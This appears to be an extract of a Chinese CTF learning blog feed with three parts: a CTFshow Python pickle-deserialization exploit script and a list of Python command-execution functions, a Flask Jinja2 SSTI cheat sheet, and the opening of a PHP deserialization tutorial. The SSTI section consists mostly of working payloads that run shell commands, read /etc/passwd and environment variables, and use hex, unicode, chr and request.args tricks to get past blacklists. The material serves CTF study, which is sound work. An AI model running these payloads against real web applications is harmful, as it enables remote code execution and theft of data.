<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag | tee 1.txt`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>







<h1 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h1><p>提示：过滤了 os.system</p>
<p>使用上题脚本即可</p>
<p>python 可以执行命令的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, <span class="built_in">map</span>, <span class="built_in">input</span>,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.<span class="built_in">open</span>, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.<span class="built_in">open</span>,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.<span class="built_in">open</span>,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>python</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask Jinja2 SSTI学习记录</title>
    <url>/2024/03/09/Jinja2%20SSTI/</url>
    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
<p>flask的渲染方法有render_template和render_template_string两种。</p>
<p>感觉…没什么好多说的，就是记模板</p>
<span id="more"></span>

<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>讲述一些小细节：</p>
<ul>
<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
</li>
<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
</li>
</ul>
<p>直接读文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>

<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>

<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>

<p>参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意一下，其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>

<p>unicode绕过参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>

<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>以上是盲注的写法</p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
<p>成功率有点低就是了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>

<p><strong>chr</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>

<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>

<p>写一个16进制编码的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化学习记录</title>
    <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
<p><code>&lt;?php echo $this-&gt;tpl_id?&gt;</code>中(<code>$this-&gt;</code>表示实例化后调用具体对象)</p>
<span id="more"></span>

<p><strong>实列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//创建一个类</span><br><span class="line">	Class Stu &#123;</span><br><span class="line">		public $name = &#x27; &#x27;;</span><br><span class="line">		public $age = 0;</span><br><span class="line">		//定义一个公共访问接口</span><br><span class="line">		public function say($name,$age)&#123;</span><br><span class="line">			$this-&gt;name = $name;</span><br><span class="line">			$this-&gt;age = $age;</span><br><span class="line">			return &#x27;我的名字是&#x27;.$this-&gt;name.</span><br><span class="line">						&#x27;今年我&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//实例化两个对象</span><br><span class="line">	$jack = new Stu();</span><br><span class="line">	$smith = new Stu();</span><br><span class="line">	echo $jack-&gt;say(&#x27;jack&#x27;,30);</span><br><span class="line">	echo $smith-&gt;say(&#x27;smith&#x27;,20);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title="::"></a>::</h3><p><code>::</code>用来直接调用类中的属性或方法，没有实例化)</p>
<p><strong>实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	Class b &#123;</span><br><span class="line">		var $name = &quot;test&quot;;</span><br><span class="line">		Function getName()&#123;</span><br><span class="line">			echo &#x27;test is good&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">//直接调用</span><br><span class="line">echo b::getName();//输出为test is good</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="什么是序列化，什么是反序列化？"><a href="#什么是序列化，什么是反序列化？" class="headerlink" title="什么是序列化，什么是反序列化？"></a>什么是序列化，什么是反序列化？</h2><h3 id="php序列化：serialize"><a href="#php序列化：serialize" class="headerlink" title="php序列化：serialize()"></a>php序列化：<code>serialize()</code></h3><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
<p>php序列化的字母标识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - <span class="keyword">boolean</span></span><br><span class="line">d - <span class="keyword">double</span></span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">NULL</span></span></span><br></pre></td></tr></table></figure>
<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class TEST&#123;  </span><br><span class="line"> public $test1=&quot;11&quot;;  </span><br><span class="line"> private $test2=&quot;22&quot;;  </span><br><span class="line"> protected $test3=&quot;33&quot;;  </span><br><span class="line"> public function test4()  </span><br><span class="line"> &#123;  </span><br><span class="line"> echo $this-&gt;test1;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new TEST();  </span><br><span class="line">echo serialize($a); </span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot; TEST test2&quot;;s:2:&quot;22&quot;;s:8:&quot; * test3&quot;;s:2:&quot;33&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>详解：</p>
<ul>
<li><code>o</code>代表类，<code>4</code>代表类名长度，<code>&quot;&quot;</code>中是类名</li>
<li><code>3</code>表示类中的变量个数，<code>&#123;&#125;</code>中则是以<code>类型：长度：&quot;值&quot;</code>为格式依次展示类中变量</li>
</ul>
<p><strong>注意序列化后的内容只有成员变量，没有成员函数，比如下面的例子：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;xiaoshizi&quot;;</span><br><span class="line">        $this-&gt;b = &quot;laoshizi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function happy()&#123;</span><br><span class="line">        return $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意类中变量前的函数</strong></p>
<ul>
<li><p>如果是public，则直接输出</p>
</li>
<li><p>如果变量前是protected，则会在变量名前加上 <code>\x00*\x00</code></p>
</li>
<li><p>如果变量前是private，则会在变量名前加上 <code>\x00类名\x00属性名</code></p>
</li>
</ul>
<p>如果直接输出，则会导致不可见字符 <code>\x00</code> 丢失变成空格 <code>  </code></p>
